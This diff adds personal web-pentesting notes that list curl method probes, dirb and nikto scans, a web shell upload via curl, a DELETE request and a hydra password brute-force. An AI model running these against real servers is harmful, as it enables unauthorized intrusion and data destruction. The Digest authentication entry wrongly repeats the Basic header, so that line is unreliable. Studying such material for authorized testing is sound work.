@@ -1,0 +1,33 @@
+HTTP Tampering
+
+dirb url
+curl url
+curl -v url
+curl -v -X GET url
+curl -v -X POST url
+curl -v -X OPTIONS url
+curl -v -X HEAD url
+curl -v -I url  
+curl -X POST url -d "parameter=value&parameter2=value2" -v
+
+ls -al /usr/share/webshells/php/ 
+cp /usr/share/webshells/php/simple-backdoor.php .
+mv simple-backdoor.php shell.php
+cat shell.php
+curl url  --upload-file shell.php
+
+curl -X DELETE url
+
+HTTP Authentication: Basic and Digest
+- basic: the response will include a www-authenticate with a value "Basic"
+Authorization: Basic base-64-encoded-credentials
+- basic: the response will include a www-authenticate with a value "Digest"
+Authorization: Basic base-64-encoded-credentials
+
+hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt ip http-get /recurso/
+
+Sentitive Data Exposure
+
+dirb url
+nikto -h url
+
